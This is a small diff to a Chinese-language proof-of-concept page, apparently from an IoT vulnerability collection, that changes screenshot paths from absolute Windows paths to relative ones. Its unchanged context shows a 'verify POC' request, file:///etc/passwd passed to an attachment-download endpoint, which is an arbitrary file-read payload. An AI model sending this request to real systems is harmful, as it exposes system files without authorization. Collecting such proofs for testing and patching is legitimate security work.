@@ -18,7 +18,7 @@
 
 登录页面
 
-![image-20230704113653161](D:\TMP_FILE\awesome-poc\iot\images\image-20230704113653161.png)
+![image-20230704113653161](./images/image-20230704113653161.png)
 
 验证POC
 
@@ -26,4 +26,4 @@
 /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
 ```
 
-![image-20230704113705975](D:\TMP_FILE\awesome-poc\iot\images\image-20230704113705975.png)
+![image-20230704113705975](./images/image-20230704113705975.png)
